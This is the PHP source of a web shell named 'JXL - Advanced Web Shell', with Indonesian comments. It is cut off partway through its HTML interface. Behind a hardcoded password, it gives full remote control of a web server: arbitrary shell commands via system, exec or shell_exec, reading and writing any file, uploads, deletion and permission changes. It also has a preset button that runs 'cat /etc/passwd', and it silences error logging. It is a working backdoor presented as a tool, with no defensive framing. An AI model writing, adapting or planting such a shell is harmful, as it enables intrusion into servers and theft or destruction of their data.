<?php
// JXL - Advanced Web Shell - Ultra Safe Version
// Versi yang sangat aman untuk menghindari HTTP 500 error

// Error handling yang sangat ketat
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 0);

// Cek apakah debug mode diaktifkan
$debug_mode = isset($_GET['debug']) && $_GET['debug'] == '1';
if ($debug_mode) {
    error_reporting(E_ALL);
    ini_set('display_errors', 1);
}

// Safe session start
if (!headers_sent()) {
    @session_start();
}

// Set time limit dengan error handling
@set_time_limit(0);
@ini_set('output_buffering', 0);

// Password dan autentikasi
$password = "riotbabi123";
$auth = false;
$show_form = true;

// Cek autentikasi
if (isset($_POST['password']) && $_POST['password'] == $password) {
    $_SESSION['auth'] = true;
    $auth = true;
    $show_form = false;
} elseif (isset($_SESSION['auth']) && $_SESSION['auth'] === true) {
    $auth = true;
    $show_form = false;
}

// Fungsi dasar yang aman
function safeGetServerInfo() {
    try {
        return array(
            "PHP Version" => @phpversion() ?: "Unknown",
            "Server Software" => isset($_SERVER["SERVER_SOFTWARE"]) ? $_SERVER["SERVER_SOFTWARE"] : "Unknown",
            "Current Directory" => @getcwd() ?: "Unknown",
            "Server Time" => @date("d M Y H:i:s") ?: "Unknown",
            "Document Root" => isset($_SERVER["DOCUMENT_ROOT"]) ? $_SERVER["DOCUMENT_ROOT"] : "Unknown",
            "Server IP" => isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : "Unknown",
            "Your IP" => isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : "Unknown"
        );
    } catch (Exception $e) {
        return array("Error" => "Unable to get server info");
    }
}

function safeListDir($path) {
    try {
        if (!@is_dir($path) || !@is_readable($path)) {
            return array();
        }
        
        $items = @scandir($path);
        if (!$items) return array();
        
        $result = array();
        foreach ($items as $item) {
            if ($item != "." && $item != "..") {
                $full_path = $path . DIRECTORY_SEPARATOR . $item;
                if (@file_exists($full_path)) {
                    $result[] = array(
                        "name" => $item,
                        "type" => @is_dir($full_path) ? "dir" : "file",
                        "size" => @is_dir($full_path) ? "-" : @filesize($full_path),
                        "perms" => @substr(sprintf('%o', @fileperms($full_path)), -4) ?: "0000",
                        "lastmod" => @date("Y-m-d H:i:s", @filemtime($full_path)) ?: "Unknown"
                    );
                }
            }
        }
        return $result;
    } catch (Exception $e) {
        return array();
    }
}

function safeExecuteCommand($cmd) {
    try {
        $output = "";
        
        // Coba berbagai metode eksekusi
        if (@function_exists('system') && !@in_array('system', explode(',', @ini_get('disable_functions')))) {
            @ob_start();
            @system($cmd . ' 2>&1', $return_var);
            $output = @ob_get_clean();
        } elseif (@function_exists('exec') && !@in_array('exec', explode(',', @ini_get('disable_functions')))) {
            @exec($cmd . ' 2>&1', $result, $return_var);
            $output = @implode("\n", $result);
        } elseif (@function_exists('shell_exec') && !@in_array('shell_exec', explode(',', @ini_get('disable_functions')))) {
            $output = @shell_exec($cmd . ' 2>&1');
        } else {
            return "Error: No execution functions available";
        }
        
        // Bersihkan output dari karakter kontrol dan escape sequences
        $output = cleanTerminalOutput($output);
        
        return $output ?: "Command executed (no output)";
    } catch (Exception $e) {
        return "Error: " . $e->getMessage();
    }
}

function cleanTerminalOutput($output) {
    if (empty($output)) {
        return $output;
    }
    
    // Hapus ANSI escape sequences
    $output = preg_replace('/\x1b\[[0-9;]*[mGKHfJ]/', '', $output);
    
    // Hapus karakter kontrol lainnya
    $output = preg_replace('/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/', '', $output);
    
    // Hapus sequence khusus nano dan editor lainnya
    $output = preg_replace('/\[\?[0-9]+[hl]/', '', $output);
    $output = preg_replace('/\[[0-9;]*[HJKmr]/', '', $output);
    
    // Hapus karakter kontrol tambahan
    $output = str_replace(["\x1b", "\x07", "\x08"], '', $output);
    
    // Bersihkan whitespace berlebihan
    $output = preg_replace('/\n{3,}/', "\n\n", $output);
    $output = trim($output);
    
    return $output;
}

function safeReadFile($filepath) {
    try {
        if (@function_exists('file_get_contents')) {
            return @file_get_contents($filepath);
        } elseif (@function_exists('fopen')) {
            $handle = @fopen($filepath, 'r');
            if ($handle) {
                $content = @fread($handle, @filesize($filepath));
                @fclose($handle);
                return $content;
            }
        }
        return false;
    } catch (Exception $e) {
        return false;
    }
}

function safeWriteFile($filepath, $content) {
    try {
        if (@function_exists('file_put_contents')) {
            return @file_put_contents($filepath, $content);
        } elseif (@function_exists('fopen')) {
            $handle = @fopen($filepath, 'w');
            if ($handle) {
                $result = @fwrite($handle, $content);
                @fclose($handle);
                return $result;
            }
        }
        return false;
    } catch (Exception $e) {
        return false;
    }
}

function formatFileSize($bytes) {
    if (!is_numeric($bytes)) return "0 B";
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $i = 0;
    while ($bytes >= 1024 && $i < count($units) - 1) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes, 2) . ' ' . $units[$i];
}

// Proses aksi
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : @getcwd();
$action = isset($_GET['action']) ? $_GET['action'] : "";
$result = null;
$message = "";

if ($auth && !$show_form) {
    try {
        switch ($action) {
            case 'ls':
                $result = safeListDir($current_dir);
                break;
                
            case 'cmd':
                if (isset($_POST['command'])) {
                    $command = trim($_POST['command']);
                    
                    // Validasi command yang berpotensi bermasalah
                    $problematic_commands = ['nano', 'vi', 'vim', 'emacs', 'less', 'more', 'top', 'htop'];
                    $is_problematic = false;
                    
                    foreach ($problematic_commands as $prob_cmd) {
                        if (strpos($command, $prob_cmd) === 0 || strpos($command, ' ' . $prob_cmd) !== false) {
                            $is_problematic = true;
                            break;
                        }
                    }
                    
                    if ($is_problematic) {
                        $result = "Warning: Interactive commands like editors (nano, vi, vim) or viewers (less, more, top) may not work properly in web interface.\n\n";
                        $result .= "Try using commands like:\n";
                        $result .= "- cat filename.txt (to view file content)\n";
                        $result .= "- ls -la (to list files)\n";
                        $result .= "- pwd (to show current directory)\n";
                        $result .= "- ps aux (to show processes)\n";
                        $result .= "\nIf you need to edit files, use the File Manager -> Edit function instead.";
                    } else {
                        $result = safeExecuteCommand($command);
                    }
                }
                break;
                
            case 'read':
                if (isset($_GET['file'])) {
                    $result = safeReadFile($_GET['file']);
                }
                break;
                
            case 'edit':
                if (isset($_GET['file']) && isset($_POST['content'])) {
                    $write_result = safeWriteFile($_GET['file'], $_POST['content']);
                    $message = $write_result !== false ? "File saved successfully!" : "Failed to save file";
                    $result = safeReadFile($_GET['file']);
                } elseif (isset($_GET['file'])) {
                    $result = safeReadFile($_GET['file']);
                }
                break;
                
            case 'upload':
                if (!empty($_FILES['files']['name'][0])) {
                    $uploadResults = array();
                    $fileCount = count($_FILES['files']['name']);
                    
                    for ($i = 0; $i < $fileCount; $i++) {
                        $tmpName = $_FILES['files']['tmp_name'][$i];
                        $fileName = $_FILES['files']['name'][$i];
                        $destination = $current_dir . DIRECTORY_SEPARATOR . $fileName;
                        
                        if (@move_uploaded_file($tmpName, $destination)) {
                            $uploadResults[$fileName] = true;
                        } else {
                            $uploadResults[$fileName] = false;
                        }
                    }
                    $result = $uploadResults;
                }
                break;
                
            case 'delete':
                if (isset($_GET['item'])) {
                    if (@is_dir($_GET['item'])) {
                        $result = @rmdir($_GET['item']);
                        $message = $result ? "Directory deleted successfully!" : "Failed to delete directory";
                    } else {
                        $result = @unlink($_GET['item']);
                        $message = $result ? "File deleted successfully!" : "Failed to delete file";
                    }
                }
                break;
                
            case 'mkdir':
                if (isset($_POST['dirname'])) {
                    $result = @mkdir($current_dir . DIRECTORY_SEPARATOR . $_POST['dirname'], 0755, true);
                    $message = $result ? "Directory created successfully!" : "Failed to create directory";
                }
                break;
                
            case 'create':
                if (isset($_POST['filename']) && isset($_POST['content'])) {
                    $ext = isset($_POST['extension']) ? $_POST['extension'] : 'txt';
                    $full_filename = $current_dir . DIRECTORY_SEPARATOR . $_POST['filename'] . '.' . $ext;
                    $result = safeWriteFile($full_filename, $_POST['content']);
                    $message = $result !== false ? "File created successfully!" : "Failed to create file";
                }
                break;
                
            case 'chmod':
                if (isset($_GET['item']) && isset($_POST['mode'])) {
                    $result = @chmod($_GET['item'], octdec($_POST['mode']));
                    $message = $result ? "Permissions changed successfully!" : "Failed to change permissions";
                }
                break;
                
            case 'rename':
                if (isset($_GET['item']) && isset($_POST['newname'])) {
                    $oldPath = $_GET['item'];
                    $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $_POST['newname'];
                    $result = @rename($oldPath, $newPath);
                    $message = $result ? "Item renamed successfully!" : "Failed to rename item";
                }
                break;
        }
    } catch (Exception $e) {
        $message = "Error: " . $e->getMessage();
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>JXL - Advanced Web Shell</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --primary-bg: #0a0a0a;
            --secondary-bg: #1a1a1a;
            --accent-bg: #2a2a2a;
            --hover-bg: #3a3a3a;
            --primary-color: #00ff88;
            --secondary-color: #00ccff;
            --accent-color: #ff6b6b;
            --text-color: #e0e0e0;
            --text-muted: #a0a0a0;
            --border-color: #333;
            --success-color: #00ff88;
            --warning-color: #ffaa00;
            --danger-color: #ff4757;
            --shadow: 0 4px 20px rgba(0, 255, 136, 0.1);
            --glow: 0 0 30px rgba(0, 255, 136, 0.3);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, var(--primary-bg) 0%, #0f0f23 50%, var(--primary-bg) 100%);
            color: var(--text-color);
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
        }

        /* Animated Background */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 80%, rgba(0, 255, 136, 0.15) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(0, 204, 255, 0.15) 0%, transparent 50%),
                radial-gradient(circle at 40% 40%, rgba(255, 107, 107, 0.1) 0%, transparent 50%);
            z-index: -1;
        }

        /* Matrix Rain Effect */
        .matrix-rain {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
            opacity: 0.15;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            z-index: 1;
        }

        /* Header dengan efek yang lebih menarik */
        .header {
            text-align: center;
            margin-bottom: 40px;
            position: relative;
        }

        .header h1 {
            font-size: 4rem;
            font-weight: 700;
            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color), var(--accent-color));
            background-size: 200% 200%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 15px;
            animation: gradientShift 3s ease-in-out infinite;
            text-shadow: 0 0 50px rgba(0, 255, 136, 0.5);
            position: relative;
        }

        .header .subtitle {
            font-size: 1.4rem;
            color: var(--text-muted);
            font-weight: 300;
            letter-spacing: 3px;
            text-transform: uppercase;
        }

        @keyframes gradientShift {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }

        /* Panel dengan efek yang lebih menarik */
        .panel {
            background: rgba(26, 26, 26, 0.95);
            backdrop-filter: blur(15px);
            border: 1px solid var(--border-color);
            border-radius: 20px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: var(--shadow), inset 0 1px 0 rgba(255, 255, 255, 0.1);
            position: relative;
            overflow: hidden;
        }

        .panel:hover {
            border-color: var(--primary-color);
        }

        .panel h2 {
            color: var(--primary-color);
            font-size: 2rem;
            margin-bottom: 25px;
            display: flex;
            align-items: center;
            gap: 15px;
            position: relative;
        }

        .panel h2 i {
            font-size: 1.8rem;
            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        /* Menu dengan animasi yang lebih smooth */
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 20px;
            margin-bottom: 40px;
        }

        .menu a {
            background: linear-gradient(135deg, var(--secondary-bg), var(--accent-bg));
            color: var(--text-color);
            text-decoration: none;
            padding: 20px 25px;
            border-radius: 15px;
            text-align: center;
            font-weight: 600;
            border: 2px solid var(--border-color);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-size: 0.9rem;
        }

        .menu a:hover {
            border-color: var(--primary-color);
            color: var(--primary-color);
        }

        .menu a i {
            font-size: 1.3rem;
        }

        /* Status indicators dengan animasi */
        .status-indicator {
            padding: 15px 25px;
            border-radius: 12px;
            margin: 15px 0;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 12px;
            position: relative;
            overflow: hidden;
        }

        .status-safe {
            background: rgba(0, 255, 136, 0.15);
            color: var(--success-color);
            border: 2px solid rgba(0, 255, 136, 0.4);
        }

        .status-warning {
            background: rgba(255, 170, 0, 0.15);
            color: var(--warning-color);
            border: 2px solid rgba(255, 170, 0, 0.4);
        }

        .status-danger {
            background: rgba(255, 71, 87, 0.15);
            color: var(--danger-color);
            border: 2px solid rgba(255, 71, 87, 0.4);
        }

        /* Table dengan styling yang lebih menarik */
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 25px;
            background: rgba(42, 42, 42, 0.8);
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
        }

        th, td {
            padding: 18px;
            text-align: left;
            border-bottom: 1px solid var(--border-color);
            transition: all 0.3s ease;
        }

        th {
            background: linear-gradient(135deg, var(--accent-bg), var(--hover-bg));
            color: var(--primary-color);
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            font-size: 0.85rem;
            position: relative;
        }

        th::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
        }

        tr:hover td {
            background: rgba(0, 255, 136, 0.08);
        }

        tr:nth-child(even) td {
            background: rgba(255, 255, 255, 0.03);
        }

        /* Form styling yang lebih menarik */
        .form-group {
            margin-bottom: 25px;
        }

        label {
            display: block;
            margin-bottom: 10px;
            color: var(--primary-color);
            font-weight: 600;
            font-size: 1rem;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        input[type="text"], 
        input[type="password"], 
        input[type="file"],
        textarea, 
        select {
            width: 100%;
            padding: 15px 20px;
            background: rgba(42, 42, 42, 0.9);
            border: 2px solid var(--border-color);
            border-radius: 12px;
            color: var(--text-color);
            font-family: 'Fira Code', monospace;
            font-size: 1rem;
            transition: all 0.4s ease;
            position: relative;
        }

        input:focus, textarea:focus, select:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.4);
            background: rgba(42, 42, 42, 1);
        }

        input[type="submit"], button {
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            color: var(--primary-bg);
            border: none;
            padding: 15px 30px;
            border-radius: 12px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.4s ease;
            text-transform: uppercase;
            letter-spacing: 2px;
            font-size: 1rem;
            position: relative;
            overflow: hidden;
        }

        input[type="submit"]:hover, button:hover {
            box-shadow: 0 10px 30px rgba(0, 255, 136, 0.5);
            filter: brightness(1.2);
        }

        /* Code blocks dengan styling yang lebih menarik */
        pre {
            background: rgba(10, 10, 10, 0.9);
            padding: 25px;
            border-radius: 15px;
            overflow-x: auto;
            border: 2px solid var(--border-color);
            font-family: 'Fira Code', monospace;
            font-size: 0.95rem;
            line-height: 1.8;
            position: relative;
        }

        pre::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
            border-radius: 15px 15px 0 0;
        }

        /* Links dengan hover effect */
        a {
            color: var(--secondary-color);
            text-decoration: none;
            transition: all 0.3s ease;
            position: relative;
        }

        a:hover {
            color: var(--primary-color);
            text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
        }

        /* Footer dengan styling yang lebih menarik */
        footer {
            text-align: center;
            padding: 40px 0;
            color: var(--text-muted);
            border-top: 2px solid var(--border-color);
            margin-top: 60px;
            position: relative;
        }

        footer::before {
            content: '';
            position: absolute;
            top: -2px;
            left: 50%;
            width: 100px;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--primary-color), transparent);
            transform: translateX(-50%);
        }

        /* Responsive design yang lebih baik */
        @media (max-width: 768px) {
            .container { padding: 15px; }
            .header h1 { font-size: 2.8rem; }
            .menu { 
                grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); 
                gap: 15px;
            }
            .panel { padding: 20px; }
            th, td { padding: 12px; font-size: 0.9rem; }
            .action-buttons {
                justify-content: center;
            }
        }

        /* Scrollbar yang lebih menarik */
        ::-webkit-scrollbar {
            width: 12px;
        }

        ::-webkit-scrollbar-track {
            background: var(--primary-bg);
            border-radius: 6px;
        }

        ::-webkit-scrollbar-thumb {
            background: linear-gradient(var(--primary-color), var(--secondary-color));
            border-radius: 6px;
            border: 2px solid var(--primary-bg);
        }

        ::-webkit-scrollbar-thumb:hover {
            background: linear-gradient(var(--secondary-color), var(--accent-color));
        }
        
        .current-directory {
            margin-top: 40px;
        }
        
        .command-output, .file-content {
            max-height: 400px;
            overflow-y: auto;
        }
        
        .footer-content {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .terminal-output .command-output {
            margin: 0;
            border: none;
            border-radius: 0;
            background: transparent;
            padding: 20px;
            max-height: 500px;
            overflow-y: auto;
        }
        
        /* Additional UI Components */
        .badge {
            padding: 4px 8px;
            border-radius: 6px;
            font-size: 0.75rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .badge-dir {
            background: rgba(255, 170, 0, 0.2);
            color: var(--warning-color);
            border: 1px solid rgba(255, 170, 0, 0.4);
        }
        
        .badge-file {
            background: rgba(0, 204, 255, 0.2);
            color: var(--secondary-color);
            border: 1px solid rgba(0, 204, 255, 0.4);
        }
        
        .badge-success {
            background: rgba(0, 255, 136, 0.2);
            color: var(--success-color);
            border: 1px solid rgba(0, 255, 136, 0.4);
        }
        
        .badge-danger {
            background: rgba(255, 71, 87, 0.2);
            color: var(--danger-color);
            border: 1px solid rgba(255, 71, 87, 0.4);
        }
        
        .action-buttons {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }
        
        .btn-action {
            padding: 6px 10px;
            border-radius: 6px;
            text-decoration: none;
            font-size: 0.8rem;
            transition: all 0.3s ease;
            border: 1px solid transparent;
        }
        
        .btn-edit {
            background: rgba(0, 204, 255, 0.2);
            color: var(--secondary-color);
            border-color: rgba(0, 204, 255, 0.4);
        }
        
        .btn-chmod {
            background: rgba(255, 170, 0, 0.2);
            color: var(--warning-color);
            border-color: rgba(255, 170, 0, 0.4);
        }
        
        .btn-rename {
            background: rgba(0, 255, 136, 0.2);
            color: var(--success-color);
            border-color: rgba(0, 255, 136, 0.4);
        }
        
        .btn-delete {
            background: rgba(255, 71, 87, 0.2);
            color: var(--danger-color);
            border-color: rgba(255, 71, 87, 0.4);
        }
        
        .btn-action:hover {
            opacity: 0.8;
        }
        
        .btn-primary {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 12px 20px;
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            color: var(--primary-bg);
            text-decoration: none;
            border-radius: 8px;
            font-weight: 600;
            transition: all 0.3s ease;
        }
        
        .btn-primary:hover {
            opacity: 0.9;
        }

        .suggestion-btn:hover {
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            color: var(--primary-bg);
        }
        
        .command-help {
            margin-top: 8px;
        }
        
        .command-help small {
            color: var(--text-muted);
            font-style: italic;
        }
        
        .terminal-output {
            margin-top: 20px;
            border: 2px solid var(--border-color);
            border-radius: 12px;
            overflow: hidden;
            background: rgba(10, 10, 10, 0.9);
        }
        
        .terminal-header {
            background: linear-gradient(135deg, var(--accent-bg), var(--hover-bg));
            padding: 12px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid var(--border-color);
        }
        
        .terminal-title {
            color: var(--primary-color);
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .copy-btn {
            background: rgba(0, 255, 136, 0.2);
            color: var(--primary-color);
            border: 1px solid rgba(0, 255, 136, 0.4);
            padding: 6px 12px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.8rem;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 5px;
        }
        
        .copy-btn:hover {
            background: var(--primary-color);
            color: var(--primary-bg);
        }

        .suggestion-buttons {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
            gap: 10px;
        }
        
        .suggestion-btn {
            background: linear-gradient(135deg, var(--secondary-bg), var(--accent-bg));
            color: var(--text-color);
            border: 1px solid var(--border-color);
            padding: 10px 15px;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 0.85rem;
            display: flex;
            align-items: center;
            gap: 6px;
            justify-content: center;
        }
        
        .suggestion-btn:hover {
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            color: var(--primary-bg);
        }
    </style>
</head>
<body>
    <canvas class="matrix-rain" id="matrixRain"></canvas>
    
    <div class="container">
        <div class="header">
            <h1><i class="fas fa-terminal"></i> JXL</h1>
            <div class="subtitle">Advanced Web Shell Interface</div>
        </div>
        
        <?php if ($show_form): ?>
        <div class="panel">
            <h2><i class="fas fa-lock"></i> Authentication Required</h2>
            <div class="status-indicator status-safe">
                <i class="fas fa-shield-alt"></i> Ultra safe mode active to prevent HTTP 500 errors.
            </div>
            <form method="post">
                <div class="form-group">
                    <label for="password"><i class="fas fa-key"></i> Password:</label>
                    <input type="password" name="password" id="password" placeholder="Enter your password..." required>
                </div>
                <input type="submit" value="🚀 Login">
            </form>
        </div>
        
        <div class="panel">
            <h2><i class="fas fa-info-circle"></i> Server Information</h2>
            <table>
                <?php foreach (safeGetServerInfo() as $key => $value): ?>
                <tr>
                    <td><i class="fas fa-cog"></i> <?php echo htmlspecialchars($key); ?></td>
                    <td><?php echo htmlspecialchars($value); ?></td>
                </tr>
                <?php endforeach; ?>
            </table>
        </div>
        
        <?php else: ?>
        
        <div class="status-indicator status-safe">
            <i class="fas fa-check-circle"></i> Authentication successful! System ready for operations.
        </div>
        
        <div class="menu">
            <a href="?"><i class="fas fa-home"></i> Home</a>
            <a href="?action=ls&dir=<?php echo urlencode($current_dir); ?>"><i class="fas fa-folder-open"></i> File Manager</a>
            <a href="?action=cmd"><i class="fas fa-terminal"></i> Command</a>
            <a href="?action=upload"><i class="fas fa-cloud-upload-alt"></i> Upload</a>
            <a href="?action=create"><i class="fas fa-file-plus"></i> Create File</a>
            <a href="?action=mkdir"><i class="fas fa-folder-plus"></i> New Folder</a>
            <a href="?debug=1" style="background: linear-gradient(135deg, #ff4757, #ff6b6b);"><i class="fas fa-bug"></i> Debug</a>
        </div>
        
        <?php if ($message): ?>
        <div class="status-indicator <?php echo strpos($message, 'successfully') !== false ? 'status-safe' : 'status-danger'; ?>">
            <i class="fas fa-<?php echo strpos($message, 'successfully') !== false ? 'check-circle' : 'exclamation-triangle'; ?>"></i> 
            <?php echo htmlspecialchars($message); ?>
        </div>
        <?php endif; ?>
        
        <?php
        switch ($action) {
            case 'ls':
        ?>
        <div class="panel">
            <h2><i class="fas fa-folder-open"></i> File Manager</h2>
            <div class="status-indicator status-safe">
                <i class="fas fa-map-marker-alt"></i> Current Directory: <?php echo htmlspecialchars($current_dir); ?>
            </div>
            <table>
                <tr>
                    <th><i class="fas fa-file-signature"></i> Name</th>
                    <th><i class="fas fa-tag"></i> Type</th>
                    <th><i class="fas fa-weight-hanging"></i> Size</th>
                    <th><i class="fas fa-shield-alt"></i> Permissions</th>
                    <th><i class="fas fa-clock"></i> Last Modified</th>
                    <th><i class="fas fa-tools"></i> Actions</th>
                </tr>
                <tr>
                    <td colspan="6">
                        <a href="?action=ls&dir=<?php echo urlencode(dirname($current_dir)); ?>">
                            <i class="fas fa-level-up-alt"></i> .. (Parent Directory)
                        </a>
                    </td>
                </tr>
                <?php if (is_array($result)): foreach ($result as $item): ?>
                <tr>
                    <td>
                        <?php if ($item['type'] == 'dir'): ?>
                        <a href="?action=ls&dir=<?php echo urlencode($current_dir . DIRECTORY_SEPARATOR . $item['name']); ?>">
                            <i class="fas fa-folder" style="color: var(--warning-color);"></i> <?php echo htmlspecialchars($item['name']); ?>
                        </a>
                        <?php else: ?>
                        <a href="?action=read&file=<?php echo urlencode($current_dir . DIRECTORY_SEPARATOR . $item['name']); ?>">
                            <i class="fas fa-file" style="color: var(--secondary-color);"></i> <?php echo htmlspecialchars($item['name']); ?>
                        </a>
                        <?php endif; ?>
                    </td>
                    <td>
                        <span class="badge badge-<?php echo $item['type']; ?>">
                            <?php echo strtoupper($item['type']); ?>
                        </span>
                    </td>
                    <td><?php echo is_numeric($item['size']) ? formatFileSize($item['size']) : $item['size']; ?></td>
                    <td><code><?php echo htmlspecialchars($item['perms']); ?></code></td>
                    <td><?php echo htmlspecialchars($item['lastmod']); ?></td>
                    <td>
                        <div class="action-buttons">
                            <?php if ($item['type'] == 'file'): ?>
                            <a href="?action=edit&file=<?php echo urlencode($current_dir . DIRECTORY_SEPARATOR . $item['name']); ?>" class="btn-action btn-edit">
                                <i class="fas fa-edit"></i>
                            </a>
                            <?php endif; ?>
                            <a href="?action=chmod&item=<?php echo urlencode($current_dir . DIRECTORY_SEPARATOR . $item['name']); ?>" class="btn-action btn-chmod">
                                <i class="fas fa-key"></i>
                            </a>
                            <a href="?action=rename&item=<?php echo urlencode($current_dir . DIRECTORY_SEPARATOR . $item['name']); ?>" class="btn-action btn-rename">
                                <i class="fas fa-signature"></i>
                            </a>
                            <a href="?action=delete&item=<?php echo urlencode($current_dir . DIRECTORY_SEPARATOR . $item['name']); ?>" 
                               onclick="return confirm('Are you sure you want to delete this item?')" class="btn-action btn-delete">
                                <i class="fas fa-trash"></i>
                            </a>
                        </div>
                    </td>
                </tr>
                <?php endforeach; endif; ?>
            </table>
        </div>
        <?php
                break;
                
            case 'cmd':
        ?>
        <div class="panel">
            <h2><i class="fas fa-terminal"></i> Command Terminal</h2>
            <div class="status-indicator status-warning">
                <i class="fas fa-exclamation-triangle"></i> Execute commands with caution. Some functions may be disabled by the server.
            </div>
            
            <!-- Command Suggestions -->
            <div class="command-suggestions">
                <h4><i class="fas fa-lightbulb"></i> Common Commands:</h4>
                <div class="suggestion-buttons">
                    <button type="button" onclick="setCommand('ls -la')" class="suggestion-btn">
                        <i class="fas fa-list"></i> ls -la
                    </button>
                    <button type="button" onclick="setCommand('pwd')" class="suggestion-btn">
                        <i class="fas fa-map-marker-alt"></i> pwd
                    </button>
                    <button type="button" onclick="setCommand('whoami')" class="suggestion-btn">
                        <i class="fas fa-user"></i> whoami
                    </button>
                    <button type="button" onclick="setCommand('ps aux')" class="suggestion-btn">
                        <i class="fas fa-tasks"></i> ps aux
                    </button>
                    <button type="button" onclick="setCommand('df -h')" class="suggestion-btn">
                        <i class="fas fa-hdd"></i> df -h
                    </button>
                    <button type="button" onclick="setCommand('free -m')" class="suggestion-btn">
                        <i class="fas fa-memory"></i> free -m
                    </button>
                    <button type="button" onclick="setCommand('uname -a')" class="suggestion-btn">
                        <i class="fas fa-info"></i> uname -a
                    </button>
                    <button type="button" onclick="setCommand('cat /etc/passwd')" class="suggestion-btn">
                        <i class="fas fa-users"></i> users
                    </button>
                </div>
            </div>
            
            <form method="post">
                <div class="form-group">
                    <label for="command"><i class="fas fa-code"></i> Command:</label>
                    <input type="text" name="command" id="command" placeholder="Enter your command here..." autofocus autocomplete="off">
                    <div class="command-help">
                        <small><i class="fas fa-info-circle"></i> Tip: Avoid interactive commands like nano, vi, less. Use File Manager for editing files.</small>
                    </div>
                </div>
                <input type="submit" value="🚀 Execute">
            </form>
            
            <?php if ($result !== null): ?>
            <h3><i class="fas fa-desktop"></i> Output:</h3>
            <div class="terminal-output">
                <div class="terminal-header">
                    <span class="terminal-title"><i class="fas fa-terminal"></i> Terminal Output</span>
                    <button type="button" onclick="copyOutput()" class="copy-btn">
                        <i class="fas fa-copy"></i> Copy
                    </button>
                </div>
                <pre class="command-output" id="commandOutput"><?php echo htmlspecialchars($result); ?></pre>
            </div>
            <?php endif; ?>
        </div>
        <?php
                break;
                
            case 'read':
        ?>
        <div class="panel">
            <h2><i class="fas fa-file-alt"></i> File Viewer</h2>
            <div class="status-indicator status-safe">
                <i class="fas fa-file"></i> Viewing: <?php echo htmlspecialchars(basename($_GET['file'])); ?>
            </div>
            <pre class="file-content"><?php echo htmlspecialchars($result); ?></pre>
            <div style="margin-top: 20px;">
                <a href="?action=edit&file=<?php echo urlencode($_GET['file']); ?>" class="btn-primary">
                    <i class="fas fa-edit"></i> Edit this file
                </a>
            </div>
        </div>
        <?php
                break;
                
            case 'edit':
        ?>
        <div class="panel">
            <h2><i class="fas fa-edit"></i> File Editor</h2>
            <div class="status-indicator status-warning">
                <i class="fas fa-file-edit"></i> Editing: <?php echo htmlspecialchars(basename($_GET['file'])); ?>
            </div>
            <form method="post">
                <div class="form-group">
                    <label for="content"><i class="fas fa-code"></i> File Content:</label>
